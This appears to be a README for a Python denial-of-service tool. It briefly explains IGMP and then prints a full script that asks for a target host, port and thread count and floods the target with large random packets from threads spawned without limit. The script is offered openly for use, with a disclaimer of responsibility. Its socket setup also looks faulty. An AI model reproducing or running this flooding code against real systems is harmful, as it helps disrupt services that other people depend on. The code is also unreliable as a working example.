# Information
IGMP Denial of Service socket tools, written by myself.

**What exactly is IGMP?**
The Internet Group Management Protocol (IGMP) is a communications protocol used by hosts and adjacent routers on IPv4 networks to establish multicast group memberships. IGMP is an integral part of IP multicast and allows the network to direct multicast transmissions only to hosts that have requested them.
IGMP can be used for one-to-many networking applications such as online streaming video and gaming, and allows more efficient use of resources when supporting these types of applications.
IGMP is used on IPv4 networks. Multicast management on IPv6 networks is handled by Multicast Listener Discovery (MLD) which is a part of ICMPv6 in contrast to IGMP's bare IP encapsulation. (Source : Wikipedia)

## How To Use
First off, copy the codd from this repository, and paste it into your code.
Second, if you want it to be a hard-hitting one, you need to implement it by yourself
Third, run the **main.py** enter all the required credentials, and enter.

# Complete Code
If you're too lazy to clome the repository, just simply copy it from here!
### Python
```python
# Distributed Denial of Service by Kali
# Protected under MIT License

# Importing modules
import sys
import socket
import time
import random
import threading
import os
import urllib
from time import sleep

def main():
    global host
    global port
    global packets
    global threads
    global punch
    host = str(input("Host : "))
    port = input("Port : ")
    threads = int(input("Threads : "))
    print("Attack launched.")
    attack()

def randsender(host, port, punch):
    global packets
    global threads
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
            sock.sendto(punch, (host, int(port)))
            for y in range(threads):
                sock.sendto(punch, (host, int(port)))
        except socket.error:
            sock.close()

def attack():
    global host
    global port
    global packets
    global threads
    global punch
    socket.gethostbyname(host)
    pack = 20179
    punch = random._urandom(int(pack))
    while True:
        for x in range (threads):
            threading.Thread(target=randsender, args=(host, port, punch)).start()

if __name__ == "__main__":
    main()
# Special thanks and credit to IoTneT
```
# Important
Please read this before you use my project!
**NOTE : I DO NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS, TAKE THIS AT YOUR OWN RISK AND DONT EVER HOOK ME UP WITH THE PROBLEM YOU MADE**
